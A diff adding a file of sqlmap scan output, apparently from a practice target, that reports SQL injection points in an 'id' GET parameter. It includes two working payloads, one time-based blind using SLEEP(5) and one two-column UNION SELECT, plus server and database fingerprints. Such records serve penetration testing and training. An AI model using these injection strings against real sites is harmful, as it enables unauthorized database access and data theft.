@@ -1,0 +1,14 @@
+sqlmap identified the following injection point(s) with a total of 120 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=admin' AND (SELECT 2138 FROM (SELECT(SLEEP(5)))IxYj) AND 'ZIVL'='ZIVL&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=admin' UNION ALL SELECT CONCAT(0x716b787871,0x4e617a516e5462456a65504151506b4b67637744755153716b5041736f6b4d65596c777176754b62,0x716a717171),NULL-- -&Submit=Submit
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.63
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
